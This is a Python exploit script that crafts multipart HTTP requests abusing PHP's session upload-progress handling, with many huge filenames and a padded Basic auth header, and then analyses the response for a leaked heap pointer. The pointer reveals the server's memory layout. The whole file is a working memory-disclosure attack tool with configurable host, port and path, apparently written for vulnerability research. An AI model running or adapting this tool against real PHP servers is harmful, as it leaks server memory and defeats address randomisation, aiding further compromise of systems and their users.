#!/usr/bin/env python3
"""arm — multipart PHP_SESSION_UPLOAD_PROGRESS request builder.

Consolidated from the pre-restructure native-output-leak.py (git history kept):
same functions, same standalone CLI. Components:
  - multipart part builders (field / file_part) and arm/probe bodies
  - raw HTTP/1.1 request framing (request_bytes)
  - response reader (read_response, chunked + content-length + no-framing)
  - 14-byte frozen-profile disclosure analyzer (analyze)
"""

import argparse
import base64
import hashlib
import json
import socket
import struct
from pathlib import Path


BOUNDARY = b"NATIVEOUTPUTEXACT"
MAIN_CHUNK_SIZE = 0x200000
LEAK_OFFSET = 0x57030


def field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def file_part(index: int, filename: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="upload'
        + str(index).encode()
        + b'"; filename="' + filename + b'"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\nX\r\n"
    )


def arm_body(sid: bytes, files: int, large_filename_length: int) -> bytes:
    parts = [
        field(b"PHPSESSID", sid),
        field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
    ]
    for index in range(files):
        filename_length = 9 if index == 0 else large_filename_length
        parts.append(file_part(index, b"F" * filename_length))
    parts.append(b"--" + BOUNDARY + b"--\r\n")
    return b"".join(parts)


def probe_body() -> bytes:
    parts = [field(b"PHP_SESSION_UPLOAD_PROGRESS", b"probe")]
    for index in range(2):
        parts.append(file_part(index, b"F" * 39))
    parts.append(b"--" + BOUNDARY + b"--\r\n")
    return b"".join(parts)


def request_bytes(
    host_header: str,
    path: str,
    body: bytes,
    cookie_sid: bytes | None,
    basic_user_length: int,
    keep_alive: bool = True,
) -> bytes:
    clear = b"U" * basic_user_length + b":"
    authorization = b"Authorization: Basic " + base64.b64encode(clear) + b"\r\n"
    cookie = b""
    if cookie_sid is not None:
        cookie = b"Cookie: PHPSESSID=" + cookie_sid + b"\r\n"
    return (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keep_alive else b"Connection: close\r\n")
        + cookie
        + authorization
        + b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n\r\n"
        + body
    )


def read_line(stream) -> bytes:
    line = stream.readline(65537)
    if not line or len(line) > 65536:
        raise ValueError("invalid HTTP response line")
    return line


def read_response(stream) -> tuple[bytes, bytes, dict[str, str], int]:
    status = read_line(stream)
    if not status.startswith(b"HTTP/"):
        raise ValueError("invalid HTTP status line")
    raw_headers = bytearray(status)
    headers: dict[str, str] = {}
    while True:
        line = read_line(stream)
        raw_headers.extend(line)
        if line == b"\r\n":
            break
        if b":" not in line:
            raise ValueError("invalid HTTP header")
        name, value = line.split(b":", 1)
        headers[name.decode("latin1").strip().lower()] = value.decode("latin1").strip()

    raw_body = bytearray()
    decoded_body = bytearray()
    if "chunked" in headers.get("transfer-encoding", "").lower():
        while True:
            size_line = read_line(stream)
            raw_body.extend(size_line)
            size = int(size_line.split(b";", 1)[0].strip(), 16)
            if size == 0:
                while True:
                    trailer = read_line(stream)
                    raw_body.extend(trailer)
                    if trailer == b"\r\n":
                        break
                break
            block = stream.read(size + 2)
            if len(block) != size + 2 or not block.endswith(b"\r\n"):
                raise ValueError("truncated chunked body")
            raw_body.extend(block)
            decoded_body.extend(block[:-2])
    elif "content-length" in headers:
        size = int(headers["content-length"])
        block = stream.read(size)
        if len(block) != size:
            raise ValueError("truncated fixed-length body")
        raw_body.extend(block)
        decoded_body.extend(block)
    else:
        status_code = int(status.split()[1])
        if status_code not in range(100, 200) and status_code not in (204, 304):
            raise ValueError("persistent response has no framing")
    return bytes(raw_headers + raw_body), bytes(decoded_body), headers, int(status.split()[1])


def analyze(body: bytes, requests: list[bytes]) -> dict:
    result = {
        "body_bytes": len(body),
        "body_sha256": hashlib.sha256(body).hexdigest(),
        "candidate": False,
    }
    if len(body) < 8:
        return result
    pointer_bytes = body[:8]
    pointer = struct.unpack("<Q", pointer_bytes)[0]
    main_chunk = pointer & ~(MAIN_CHUNK_SIZE - 1)
    canonical = 0x0000700000000000 <= pointer <= 0x00007FFFFFFFFFFF
    request_contains_pointer = any(pointer_bytes in request for request in requests)
    result.update(
        {
            "pointer": f"0x{pointer:x}",
            "main_chunk": f"0x{main_chunk:x}",
            "chunk_offset": f"0x{pointer - main_chunk:x}",
            "canonical": canonical,
            "pointer_bytes_in_requests": request_contains_pointer,
            "candidate": canonical and pointer - main_chunk == LEAK_OFFSET and not request_contains_pointer,
            "prefix_hex": body[:14].hex(),
        }
    )
    return result


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--path", required=True)
    parser.add_argument("--host-header", default="127.0.0.1")
    parser.add_argument("--sid", default="abcdefgh")
    parser.add_argument("--arm-files", type=int, default=20)
    parser.add_argument("--large-filename-length", type=int, default=262144)
    parser.add_argument("--reconnect-on-close", action="store_true")
    stage = parser.add_mutually_exclusive_group()
    stage.add_argument("--arm-only", action="store_true")
    stage.add_argument("--probe-only", action="store_true")
    parser.add_argument("--output", required=True, type=Path)
    args = parser.parse_args()

    sid = args.sid.encode("ascii")
    if len(sid) != 8 or not sid.isalnum():
        raise ValueError("--sid must be exactly eight ASCII alphanumeric bytes")

    if args.arm_files < 1 or args.arm_files > 20:
        raise ValueError("--arm-files must be between 1 and 20")
    if args.large_filename_length < 1:
        raise ValueError("--large-filename-length must be positive")
    body1 = arm_body(sid, args.arm_files, args.large_filename_length)
    body2 = probe_body()
    request1 = request_bytes(args.host_header, args.path, body1, None, 23, False)
    request2 = request_bytes(args.host_header, args.path, body2, b"", 64)
    args.output.mkdir(parents=True, exist_ok=True)

    if args.arm_only:
        with socket.create_connection((args.host, args.port), timeout=60) as connection:
            connection.settimeout(60)
            stream = connection.makefile("rb", buffering=0)
            connection.sendall(request1)
            response1, decoded1, headers1, status1 = read_response(stream)
        artifacts = {
            "request-1.bin": request1,
            "response-1.bin": response1,
            "body-1.bin": decoded1,
        }
        for name, data in artifacts.items():
            (args.output / name).write_bytes(data)
        result = {
            "stage": "arm",
            "status": status1,
            "connection": headers1.get("connection", ""),
            "response_body_bytes": len(decoded1),
            "sha256": {name: hashlib.sha256(data).hexdigest() for name, data in artifacts.items()},
        }
        rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
        (args.output / "result.json").write_text(rendered)
        print(rendered, end="")
        return 0 if status1 == 500 else 2

    if args.probe_only:
        with socket.create_connection((args.host, args.port), timeout=60) as connection:
            connection.settimeout(60)
            stream = connection.makefile("rb", buffering=0)
            connection.sendall(request2)
            response2, decoded2, headers2, status2 = read_response(stream)
        artifacts = {
            "request-2.bin": request2,
            "response-2.bin": response2,
            "body-2.bin": decoded2,
        }
        for name, data in artifacts.items():
            (args.output / name).write_bytes(data)
        result = {
            "stage": "probe",
            "status": status2,
            "connection": headers2.get("connection", ""),
            "analysis": analyze(decoded2, [request2]),
            "sha256": {name: hashlib.sha256(data).hexdigest() for name, data in artifacts.items()},
        }
        rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
        (args.output / "result.json").write_text(rendered)
        print(rendered, end="")
        return 0 if result["analysis"]["candidate"] else 2

    response2 = b""
    decoded2 = b""
    headers2: dict[str, str] = {}
    status2 = 0
    with socket.create_connection((args.host, args.port), timeout=60) as connection:
        connection.settimeout(60)
        stream = connection.makefile("rb", buffering=0)
        connection.sendall(request1)
        response1, decoded1, headers1, status1 = read_response(stream)
        arm_closed = headers1.get("connection", "").lower() == "close"
        if not arm_closed:
            connection.sendall(request2)
            response2, decoded2, headers2, status2 = read_response(stream)
    if arm_closed and args.reconnect_on_close:
        with socket.create_connection((args.host, args.port), timeout=60) as connection:
            connection.settimeout(60)
            stream = connection.makefile("rb", buffering=0)
            connection.sendall(request2)
            response2, decoded2, headers2, status2 = read_response(stream)

    artifacts = {
        "request-1.bin": request1,
        "response-1.bin": response1,
        "body-1.bin": decoded1,
        "request-2.bin": request2,
        "response-2.bin": response2,
        "body-2.bin": decoded2,
    }
    for name, data in artifacts.items():
        (args.output / name).write_bytes(data)

    result = {
        "host": args.host,
        "port": args.port,
        "path": args.path,
        "same_connection": not arm_closed,
        "arm_connection_closed": arm_closed,
        "arm_status": status1,
        "arm_body_bytes": len(decoded1),
        "probe_status": status2,
        "probe_connection": headers2.get("connection", ""),
        "analysis": analyze(decoded2, [request1, request2]),
        "sha256": {name: hashlib.sha256(data).hexdigest() for name, data in artifacts.items()},
    }
    rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
    (args.output / "result.json").write_text(rendered)
    print(rendered, end="")
    return 0 if result["analysis"]["candidate"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
